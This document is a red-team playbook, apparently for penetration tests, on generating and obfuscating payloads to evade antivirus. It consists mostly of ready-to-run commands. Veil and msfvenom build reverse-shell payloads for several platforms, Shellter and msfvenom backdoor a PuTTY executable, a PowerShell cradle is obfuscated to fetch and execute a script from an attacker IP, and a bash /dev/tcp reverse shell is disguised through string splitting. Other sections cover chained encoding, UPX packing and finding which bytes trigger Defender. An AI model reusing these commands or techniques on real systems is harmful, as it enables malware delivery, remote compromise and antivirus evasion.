# Payload Obfuscation — Generation, Encoding, Packing & Custom Obfuscation

## MITRE ATT&CK Mapping
- **T1027** — Obfuscated Files or Information
- **T1027.002** — Software Packing (UPX, custom packers)
- **T1027.010** — Command Obfuscation (string splitting, base64 layers)
- **T1587.001** — Develop Capabilities: Malware
- **T1140** — Deobfuscate/Decode Files or Information

---

## 1. Decision Tree: Which Tool When

| Situation | Tool | Why | Section |
|---|---|---|---|
| Need AV-evasive standalone Meterpreter EXE | **Veil** | Multi-language generation with built-in obfuscation | §2 |
| Inject payload into existing Windows PE | **Shellter** | Dynamic PE injection preserves original functionality | §3 |
| Quick payload for any platform/format | **msfvenom** | Most versatile — all OS, all formats | §4 |
| Reduce binary size / alter signature | **UPX** | Fast packing; layer with other techniques | §5 |
| Script-based payload needs obfuscation | **Manual** | Hand-crafted Python/PS/Bash obfuscation | §6 |
| Chained approach (best evasion) | **msfvenom → Shellter** or **Veil + UPX** | Layer multiple techniques | §7 |

**Standard payload preparation sequence:**
```
1. Generate base payload (Veil or msfvenom)
2. Optionally pack with UPX (§5)
3. Optionally inject into carrier PE (Shellter §3 or msfvenom -x §4f)
4. Test against local AV — NEVER VirusTotal (§8)
5. Record evidence: SHA256, command, detection result (§9)
6. Deploy with matching handler
```

---

## 2. Veil-Evasion Payload Generation

**Tag MITRE: T1027 (Obfuscated Files or Information)**

Veil generates payloads in multiple languages with automatic variable randomization, string encryption, and junk code insertion.

### 2a. Key Payloads by Language (evasion ranking — best last)

| Language | Payload | Detection | Notes |
|---|---|---|---|
| PowerShell | `powershell/meterpreter/rev_tcp` | Highest | AMSI + ScriptBlock logging catch most |
| Python | `python/meterpreter/rev_tcp` | High | PyInstaller signatures well-known |
| Python | `python/shellcode_inject/flat` | Moderate | Raw shellcode inject, less signature |
| Ruby | `ruby/meterpreter/rev_tcp` | Low-Moderate | Uncommon, fewer signatures |
| C# | `cs/meterpreter/rev_tcp` | Low | Compiled .NET, obfuscated IL |
| Go | `go/meterpreter/rev_tcp` | Lowest | Static binary, uncommon signatures |

### 2b. CLI Generation (Non-Interactive)

```bash
# Go payload — lowest detection rate
veil -t Evasion -p go/meterpreter/rev_tcp --ip 10.10.14.5 --port 443 -o gopayload

# C# payload
veil -t Evasion -p cs/meterpreter/rev_tcp --ip 10.10.14.5 --port 8443 -o cspayload

# Python with PyInstaller compiler (default)
veil -t Evasion -p python/meterpreter/rev_tcp --ip 10.10.14.5 --port 4444 --compiler pyinstaller -o pypayload

# Custom msfvenom shellcode injected into Veil template
veil -t Evasion -p cs/meterpreter/rev_tcp --msfvenom windows/meterpreter/reverse_https --ip 10.10.14.5 --port 8443

# Pass custom options
veil -t Evasion -p python/meterpreter/rev_tcp -c LHOST=10.10.14.5 LPORT=4444 --msfoptions EXITFUNC=thread

# List all available payloads
veil -t Evasion --list-payloads
```

### 2c. Output Structure

```
/var/lib/veil/output/compiled/gopayload.exe    # Compiled binary
/var/lib/veil/output/source/gopayload.go       # Source code (for review/modification)
/var/lib/veil/output/handlers/gopayload.rc     # Metasploit handler resource script
```

### 2d. Start Matching Handler

```bash
msfconsole -r /var/lib/veil/output/handlers/gopayload.rc
```

### 2e. Ordnance Module (Shellcode Generation)

```bash
# Generate shellcode with XOR encoding and bad-char avoidance
veil -t Ordnance --ordnance-payload rev_tcp --ip 10.10.14.5 --port 4444 -e xor -b '\x00\x0a'

# List available Ordnance encoders
veil -t Ordnance --list-encoders
```

---

## 3. Shellter PE Injection

**Tag MITRE: T1027 (Obfuscated Files), T1055.001 (DLL Injection — conceptually similar)**

Shellter traces execution flow of a target PE and injects shellcode at valid execution points without adding sections or changing memory permissions.

### 3a. Prerequisites

```bash
# Linux — install Wine 32-bit support
dpkg --add-architecture i386 && apt update && apt install -y wine32 shellter
```

### 3b. Auto Mode Workflow

```bash
# 1. Get a clean 32-bit Windows PE (commonly whitelisted apps)
wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O /tmp/putty_clean.exe
sha256sum /tmp/putty_clean.exe | tee -a evidence/payload_hashes.txt

# 2. Make working copy (never modify the clean original)
cp /tmp/putty_clean.exe /tmp/putty_injected.exe

# 3. Run Shellter
shellter
# Interactive prompts:
#   Operation Mode: A (Auto)
#   PE Target: /tmp/putty_injected.exe
#   Stealth Mode: Y  ← CRITICAL — preserves original app behavior
#   Payload: L (listed/built-in)
#     Select: 1 (meterpreter_reverse_tcp)
#     LHOST: 10.10.14.5
#     LPORT: 4444

# 4. Record backdoored PE hash
sha256sum /tmp/putty_injected.exe | tee -a evidence/payload_hashes.txt
```

### 3c. Custom Shellcode (from msfvenom)

```bash
# Generate raw shellcode
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=8443 -f raw -o /tmp/custom_sc.bin

# In Shellter: select C (custom) instead of L (listed)
# Provide /tmp/custom_sc.bin as the payload file
```

### 3d. Built-in Payloads

1. `meterpreter_reverse_tcp`
2. `meterpreter_reverse_http`
3. `meterpreter_reverse_https`
4. `shell_reverse_tcp`
5. `shell_bind_tcp`
6. `WinExec` (runs arbitrary command)

### 3e. Limitations & Gotchas

- **32-bit PE only** (Community Edition) — no x64 PE, ELF, or Mach-O
- Injection **breaks Authenticode signatures** — signed binaries will show as unsigned post-injection
- **Avoid packed/compressed input PEs** — Shellter must trace execution; packed bins fail
- Wine can be flaky on some Linux setups — test `wine --version` and run `shellter` alone first
- Manual mode: useful when auto-mode fails or you need precise control of injection point

---

## 4. msfvenom Encoding & Template Injection

**Tag MITRE: T1027 (Obfuscated Files), T1027.010 (Command Obfuscation)**

### 4a. Single-Pass Encoding

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -f exe -o encoded.exe
```

### 4b. Multi-Pass Encoding (Same Encoder, Multiple Iterations)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o multi_encoded.exe
```

### 4c. Chained Encoding (Multiple Encoders via Pipe)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 \
  -f exe -o chained.exe
```

### 4d. Bad Character Exclusion

```bash
# msfvenom auto-selects a compatible encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -f c

# Combine with explicit encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f exe -o clean.exe
```

### 4e. Key Encoders

| Encoder | Arch | Notes |
|---|---|---|
| `x86/shikata_ga_nai` | x86 | Polymorphic XOR additive feedback, most widely used |
| `x64/xor` | x64 | Basic XOR for 64-bit payloads |
| `x64/xor_dynamic` | x64 | Dynamic key XOR, harder to signature |
| `x86/countdown` | x86 | Good for second stage in chains |
| `cmd/powershell_base64` | any | Base64-encodes PowerShell commands |
| `php/base64` | any | Base64-wraps PHP payloads |

### 4f. Template Injection (Embed in Legitimate Binary)

```bash
# Inject into legitimate PE (basic — new section)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x /tmp/putty.exe -f exe -o backdoored_putty.exe

# Keep original functionality — run payload as new thread (-k flag)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x /tmp/putty.exe -k -f exe -o stealth_putty.exe

# x64 template — must use exe-only format
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x /tmp/template64.exe -f exe-only -o payload64.exe
```

⚠️ **Note:** The `-k` flag (keep template behavior) is only reliable on older Windows (XP-era). On modern Windows, prefer Shellter for PE injection with preserved functionality.

### 4g. Cross-Platform Payloads

```bash
# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# macOS Mach-O
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f macho -o shell.macho

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# Java WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -o payload.apk

# PowerShell (base64 encoded for delivery)
msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.5 LPORT=4444 -f raw | \
  iconv -t UTF-16LE | base64 -w 0
# Deliver: powershell -enc <output>
```

⚠️ **Encoding is NOT AV evasion.** Modern AV uses behavioral analysis, sandboxing, and emulation. Encoding changes byte patterns but not behavior. Layer with other techniques.

---

## 5. UPX Packing

**Tag MITRE: T1027.002 (Software Packing)**

UPX compresses executables by 50-70%, altering their byte signature. Minimal standalone evasion value — most AV can auto-unpack UPX — but useful as a layer.

### 5a. Core Commands

```bash
# Maximum compression
upx --best payload.exe -o payload_packed.exe

# Ultra-brute (slowest, smallest output)
upx --ultra-brute payload.exe -o payload_ultra.exe

# In-place packing (overwrites original)
upx --best payload.exe

# Verify packed file
upx -t payload_packed.exe

# Inspect pack info
upx -l payload_packed.exe

# Unpack (restore original)
upx -d payload_packed.exe
```

### 5b. Layered with Veil/msfvenom

```bash
# Generate → pack → record
veil -t Evasion -p go/meterpreter/rev_tcp --ip 10.10.14.5 --port 443 -o gopayload
upx --best /var/lib/veil/output/compiled/gopayload.exe -o gopayload_packed.exe
sha256sum /var/lib/veil/output/compiled/gopayload.exe gopayload_packed.exe >> evidence/payload_hashes.txt
```

### 5c. Limitations

- Most AV vendors auto-unpack UPX before scanning (UPX header is a known signature)
- Some tools can strip the UPX header to hinder auto-unpacking, but this is fragile
- Best used for size reduction + one additional signature-change layer, not primary evasion

---

## 6. Custom Script Obfuscation

**Tag MITRE: T1027.010 (Command Obfuscation)**

When tool-generated payloads are detected, hand-crafted obfuscation can bypass signatures.

### 6a. Python: String Splitting + Base64 Layers

```python
import base64, os

# Split command string across variables with base64-encoded fragments
_a = base64.b64decode('cG93ZXJzaGVsbCAt').decode()  # "powershell -"
_b = base64.b64decode('ZSA8YjY0Pg==').decode()       # "e <b64>"
_cmd = _a + _b
# All variable names should be randomized (e.g., _xK4m, _pR7q)
os.system(_cmd)
```

### 6b. PowerShell: Variable Randomization + String Concatenation

```powershell
# Breaks static string signatures
$v1 = 'Ne' + 'w-Ob' + 'ject'
$v2 = 'Net' + '.Web' + 'Client'
$v3 = 'Down' + 'load' + 'String'
$v4 = 'http://10.10.14.5/shell.ps1'
$v5 = (& ([scriptblock]::Create("$v1 $v2")))
$v5."$v3"($v4) | & ([scriptblock]::Create('IEX'))
```

### 6c. PowerShell: GZip + Base64 Compression Wrapper

```powershell
# === Encoder (attacker side) ===
$bytes = [IO.File]::ReadAllBytes('shell.ps1')
$ms = New-Object IO.MemoryStream
$gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Compress)
$gz.Write($bytes, 0, $bytes.Length); $gz.Close()
[Convert]::ToBase64String($ms.ToArray()) | Out-File encoded_payload.txt

# === Decoder stub (deliver to target) ===
$d = [Convert]::FromBase64String((Get-Content encoded_payload.txt))
$ms = New-Object IO.MemoryStream(,$d)
$gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($gz)
IEX $sr.ReadToEnd()
```

### 6d. Bash: Variable-Based Command Obfuscation

```bash
# Breaks simple grep/string-match detection
a="ba""sh"
b="-i"
c="/dev/tcp/10.10.14.5/4444"
eval "$a $b >& $c 0>&1"
```

### 6e. General Principles

- **Variable randomization:** Replace all meaningful names with random strings
- **String splitting:** Break known-bad strings across multiple variables
- **Encoding layers:** Base64, XOR, AES — each layer adds complexity for static analysis
- **Dynamic resolution:** Use `eval`, `Invoke-Expression`, `exec()` to resolve strings at runtime
- **Junk code insertion:** Add benign operations between payload lines to break pattern matching

---

## 7. Chained / Layered Approaches (Best Evasion)

**Tag MITRE: T1027 (Obfuscated Files), T1027.002 (Software Packing)**

Layering multiple techniques forces AV to defeat each layer independently.

### 7a. Veil + UPX

```bash
veil -t Evasion -p go/meterpreter/rev_tcp --ip 10.10.14.5 --port 443 -o gopayload
upx --best /var/lib/veil/output/compiled/gopayload.exe -o final_payload.exe
```

### 7b. msfvenom Chained Encoding → Shellter Injection

```bash
# Generate encoded raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f raw -o /tmp/encoded_sc.bin

# Inject into carrier PE via Shellter (select Custom payload → /tmp/encoded_sc.bin)
shellter
# A → /tmp/putty_injected.exe → Y → C → /tmp/encoded_sc.bin
```

### 7c. msfvenom Template + UPX

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x /tmp/legit.exe -k -f exe -o /tmp/backdoored.exe
upx --best /tmp/backdoored.exe -o /tmp/final.exe
```

---

## 8. AV Testing (OPSEC-Safe Methods)

⚠️ **NEVER use VirusTotal** — it distributes samples to ALL AV vendors. Your payload's signature gets added to detection databases within hours.

### 8a. Local Windows VM with Defender

```powershell
# Check Defender status
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AMServiceEnabled

# Attempt execution of payload, then check detections
Get-MpThreatDetection | Select-Object ThreatName, ActionSuccess, ProcessName
```

### 8b. ThreatCheck / DefenderCheck (Pinpoint Triggering Bytes)

```bash
# Identify exact byte offset that triggers Defender signature
ThreatCheck.exe -f payload.exe -e Defender
# Output shows which bytes to modify — change those and retest
```

### 8c. Isolated VM with Target's AV

If the target organization's AV product is known (from recon), install it in a VM and test under real conditions.

### 8d. AntiScan.me Concept

Multi-engine scan services that claim not to distribute samples. **Use with caution** — never for high-sensitivity engagements. Prefer local testing.

---

## 9. Evidence Collection

**Every payload generated during an engagement must be recorded:**

```bash
# Evidence template — append for each payload
cat >> evidence/payload_generation_log.txt << EOF
=== Payload Generation ===
Date:       $(date -u +%Y-%m-%dT%H:%M:%SZ)
Tool:       <veil | msfvenom | shellter>
Command:    <exact generation command>
Output:     <filename>
SHA256:     $(sha256sum payload.exe | awk '{print $1}')
MD5:        $(md5sum payload.exe | awk '{print $1}')
File type:  $(file payload.exe)
Size:       $(stat -c%s payload.exe) bytes
AV Test:    <detected/undetected, which AV, version>
Delivery:   <email/USB/web download/SMB>
Target:     <hostname/IP>
Handler:    <LHOST:LPORT, protocol>
---
EOF
```

### Required evidence outputs:
- `evidence.json` — full payload metadata and generation details
- `findings.json` — which payloads evaded/were detected, AV product versions
- `payload_hashes.txt` — SHA256 of every generated artifact (clean originals + modified)
- `generation_log.txt` — human-readable generation commands and parameters
